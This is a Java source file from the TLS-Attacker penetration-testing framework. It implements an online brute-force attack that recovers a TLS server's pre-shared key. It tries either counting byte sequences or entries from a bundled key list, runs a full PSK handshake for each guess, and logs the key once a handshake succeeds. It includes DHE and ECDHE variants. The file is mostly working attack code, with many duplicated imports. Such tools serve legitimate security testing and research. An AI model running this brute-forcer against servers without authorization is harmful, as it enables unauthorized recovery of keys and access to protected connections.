/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.tlsattacker.attacks.config.PskBruteForcerAttackServerCommandConfig;
import de.rub.nds.tlsattacker.attacks.pkcs1.Bleichenbacher;
import de.rub.nds.tlsattacker.attacks.pkcs1.PKCS1VectorGenerator;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.AlertDescription;
import de.rub.nds.tlsattacker.core.constants.AlertLevel;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.util.CertificateFetcher;
import de.rub.nds.tlsattacker.core.util.LogLevel;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.modifiablevariable.integer.IntegerModificationFactory;
import de.rub.nds.modifiablevariable.integer.ModifiableInteger;
import de.rub.nds.modifiablevariable.singlebyte.ModifiableByte;
import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEPoint;
import de.rub.nds.tlsattacker.attacks.ec.ICEPointReader;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.CipherSuite;
import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.core.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.FinishedMessage;
import de.rub.nds.tlsattacker.core.protocol.message.HeartbeatMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskDhClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskEcDhClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskDheServerKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.PskEcDheServerKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.core.record.layer.RecordLayer;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTraceUtil;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.action.TLSAction;
import de.rub.nds.tlsattacker.transport.udp.timing.TimingClientUdpTransportHandler;
import java.nio.charset.Charset;
import org.bouncycastle.util.BigIntegers;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import de.rub.nds.tlsattacker.transport.ConnectionEnd;

/**
 *
 * @author florian
 */
public class PskBruteForcerAttackServer extends Attacker<PskBruteForcerAttackServerCommandConfig> {
    private static final Logger LOGGER = LogManager.getLogger(PskBruteForcerAttackServer.class);

    public PskBruteForcerAttackServer(PskBruteForcerAttackServerCommandConfig config) {
        super(config, false);
        // tlsConfig = config.createConfig();

    }

    @Override
    public void executeAttack() {
        if (config.getUsePskTable()) {
            executeAttackWithPskTable();
        } else {
            executeAttackWithoutPskTable();
        }
    }

    public void executeAttackWithoutPskTable() {
        boolean result = false;
        int counter = 0;
        int size = 0;
        while (!result) {
            if (counter % 256 == 0) {
                size++;
            }
            LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                    ArrayConverter.bytesToHexString(ArrayConverter.intToBytes(counter, size)));
            result = executeProtocolFlowToServer(ArrayConverter.intToBytes(counter, size));
            counter++;
        }
    }

    public void executeAttackWithPskTable() {
        String fileName = "psk_database.txt";
        boolean result = false;
        BufferedReader br = new BufferedReader(new InputStreamReader(PskBruteForcerAttackServer.class.getClassLoader()
                .getResourceAsStream(fileName)));
        String line;
        try {
            while ((line = br.readLine()) != null && !result) {
                if (line.length() != 0) {
                    result = executeProtocolFlowToServer(ArrayConverter.hexStringToByteArray(line));
                }
            }
        } catch (IOException | NumberFormatException ex) {
            throw new ConfigurationException(ex.getLocalizedMessage(), ex);
        }
    }

    @Override
    public Boolean isVulnerable() {
        Config tlsConfig = config.createConfig();
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHandshakeWorkflow();
        ClientHelloMessage message = new ClientHelloMessage(tlsConfig);
        trace.addTlsAction(new SendAction(message));
        List<ProtocolMessage> messageList = new LinkedList<>();
        messageList.add(new ServerHelloMessage(tlsConfig));
        messageList.add(new ServerHelloDoneMessage(tlsConfig));
        trace.addTlsAction(new ReceiveAction(messageList));
        tlsConfig.setWorkflowTrace(trace);
        State state = new State(tlsConfig, trace);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);
        workflowExecutor.executeWorkflow();
        if (state.getTlsContext().getSelectedCipherSuite() == CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable (probably), Server uses PSK");
            return true;
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Not Vulnerable (probably), Server not uses PSK");
            return false;
        }
    }

    private boolean executeProtocolFlowToServer(byte[] pskTry) {
        Config tlsConfig = config.createConfig();
        tlsConfig.setDefaultPSKKey(pskTry);
        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createHelloWorkflow();
        State state = new State(tlsConfig, trace);
        state.setWorkflowTrace(trace);
        // state.getTlsContext().setClientSupportedCiphersuites(CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA);
        // tlsConfig.setDefaultSelectedCipherSuite(CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA);

        setTraceActions(trace, tlsConfig);

        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                tlsConfig.getWorkflowExecutorType(), state);

        setClientKeyExchangeMessage(trace);
        workflowExecutor.executeWorkflow();
        // boolean result = trace.executedAsPlanned();
        // String workflowString = state.getWorkflowTrace().toString();
        // if (!result) {
        // LOGGER.info(workflowString);
        // }
        // if (trace.getLastAction() == new ReceiveAction(new
        // FinishedMessage(tlsConfig))) {
        // LOGGER.log(LogLevel.CONSOLE_OUTPUT, "PSK " + "1a2b3c4d");
        // }

        if (trace.executedAsPlanned()) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "PSK " + ArrayConverter.bytesToHexString(pskTry));
            return true;
        } else {
            // LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Wrong PSK");
            return false;
        }
    }

    private void setTraceActions(WorkflowTrace trace, Config tlsConfig) {
        trace.removeTlsAction(1);
        if (config.getDheDowngrade()) {
            trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig), new PskDheServerKeyExchangeMessage(
                    tlsConfig), new ServerHelloDoneMessage(tlsConfig)));
        } else if (config.getEcDheDowngrade()) {
            trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig),
                    new PskEcDheServerKeyExchangeMessage(tlsConfig), new ServerHelloDoneMessage(tlsConfig)));
        } else {
            trace.addTlsAction(new ReceiveAction(new ServerHelloMessage(tlsConfig), new ServerHelloDoneMessage(
                    tlsConfig)));
        }

        if (config.getDheDowngrade()) {
            trace.addTlsAction(new SendAction(new PskDhClientKeyExchangeMessage(tlsConfig),
                    new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
        } else if (config.getEcDheDowngrade()) {
            trace.addTlsAction(new SendAction(new PskEcDhClientKeyExchangeMessage(tlsConfig),
                    new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
        } else {
            trace.addTlsAction(new SendAction(new PskClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
                    tlsConfig), new FinishedMessage(tlsConfig)));
        }

        trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
    }

    private void setClientKeyExchangeMessage(WorkflowTrace trace) {
        if (config.getDheDowngrade()) {
            PskDhClientKeyExchangeMessage message = (PskDhClientKeyExchangeMessage) WorkflowTraceUtil
                    .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.prepareComputations();
            message.setIdentity("Client_Identity".getBytes(Charset.forName("UTF-8")));
        } else if (config.getEcDheDowngrade()) {
            PskEcDhClientKeyExchangeMessage message = (PskEcDhClientKeyExchangeMessage) WorkflowTraceUtil
                    .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.prepareComputations();
            message.setIdentity("Client_Identity".getBytes(Charset.forName("UTF-8")));
        } else {
            PskClientKeyExchangeMessage message = (PskClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
            message.prepareComputations();
            message.setIdentity("Client_Identity".getBytes(Charset.forName("UTF-8")));
        }
    }
}